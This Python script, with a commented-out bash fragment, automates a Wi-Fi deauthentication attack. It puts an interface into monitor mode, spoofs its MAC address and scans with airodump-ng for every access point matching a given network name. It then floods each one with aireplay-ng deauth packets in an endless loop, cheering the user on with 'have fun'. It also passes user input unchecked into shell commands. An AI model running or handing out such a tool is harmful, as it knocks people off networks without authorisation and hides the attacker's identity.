import sys
import os
import csv
import re
import signal

def signal_handler(signal, frame):
    print("\nprogram exiting gracefully")
    os.system("iw mon0 del")
    os.system("rm testdump-*")
    sys.exit(0)
    print("#############################################")
    print("#----We are done, hope you did good things--#")
    print("#############################################")

signal.signal(signal.SIGINT, signal_handler)


def csv2blob(filename):

    with open(filename,'rt') as f:
        z = f.read()
       
    # Split into two parts: stations (APs) and clients

    parts = z.split('\n\n')
    print('myFile')
    print(z)
    print('parts')
    print(parts)
    stations = parts[0]
    print(stations)
    clients = parts[1]
    print(clients)
    import sys
    if sys.version_info[0] < 3:
        from StringIO import StringIO
    else:
        from io import StringIO

    stations_str = StringIO(stations)
    clients_str  = StringIO(clients)

    r = csv.reader(stations_str)
    i = list(r)
    z = [k for k in i if k != []]

    stations_list = z

    r = csv.reader(clients_str)
    i = list(r)
    z = [k for k in i if k != []]

    clients_list = z
    
    return stations_list, clients_list

essid= sys.argv[1]
interface=sys.argv[2]
print("I will deauth the following ESSID: ")
print(essid)


os.system("iw "+interface+" interface add mon0 type monitor")

os.system("airmon-ng check kill")
os.system("ifconfig mon0 down")
os.system("macchanger -r mon0")
os.system("	ifconfig mon0 up")
print( "------------mon0 created--------------")
os.system("gnome-terminal -- airodump-ng -w testdump -o csv --essid "+essid+" mon0 ")
input("Press Enter to continue...")
os.system("killall airodump-ng")
input="testdump-01.csv"
stations_list, clients_list = csv2blob(input)

nstations = len(stations_list)

sthead = stations_list[0]

stations_head = [j.strip() for j in sthead]

stations_data = [stations_list[i] for i in range(1,nstations)]
print("I have found the following Networks with the ESSID: "+essid)
print("we are going to deauth them --- have fun")

for i,row in enumerate(stations_data):

    # get indices
    ap_mac_ix  = stations_head.index('BSSID')
    ap_name_ix = stations_head.index('ESSID')
    ap_sec_ix  = stations_head.index('Privacy')
    ap_pow_ix  = stations_head.index('Power')
    ap_ch_ix   = stations_head.index('channel')
    # get values
    ap_mac = row[ap_mac_ix].strip()
    ap_name = row[ap_name_ix].strip()
    ap_sec = row[ap_sec_ix].strip()
    ap_pow = row[ap_pow_ix].strip()
    ap_ch = row[ap_ch_ix].strip()



    if ap_name=='':
        ap_name="unlabeled"

    mac_name = re.sub('\:','_',ap_mac)

        ######################
        # Print out some information
        
    print ("="*40)
    print ("Name:",ap_name)
    print ("Channel:",ap_ch)
    print ("MAC:",ap_mac)
    print ("Encryption:",ap_sec)
    print ("Power:",ap_pow)
    print ("")
stored_exception=0
while True:
    try:
            for i,row in enumerate(stations_data):
                ap_mac_ix  = stations_head.index('BSSID')
                os.system("aireplay-ng -0 5 -a "+row[ap_mac_ix]+" mon0 -D")
            if stored_exception == 1:
                break
            print(stored_exception)
    except KeyboardInterrupt:
       stored_exception=1


"""

while IFS=',' read -r f1 f2 f3 f4 f5 f6 f7 f8 f9
do 
echo "${counter}"
echo "${f1}"
if [[ $f1 == Station* ]]
then
	break
fi
  bssidArray[counter]=$f1
counter=$((counter+1))
done < "$input"
echo ${bssidArray[*]}


#killall airodump-ng
#rm testdump*
iw mon0 del

counter=0


for ((z=0;z<anzahl;z++))
do
 	
iw ${wlanIface} interface add mon${z} type monitor
sleep 2  		
	airmon-ng check kill
	
	ifconfig mon${z} down
	macchanger -r mon${z}
	ifconfig mon${z} up
	echo "--#######################################--"
	echo "------------mon${z} created--------------"
	echo "--#######################################--"
done

read -p "press enter to delete the interfaces" enter
for ((z=0;z<anzahl;z++))
do
iw mon${z} del
	echo "--#######################################--"
	echo "------------------mon${z} deleted---------"
	echo "--#######################################--"
done
"""

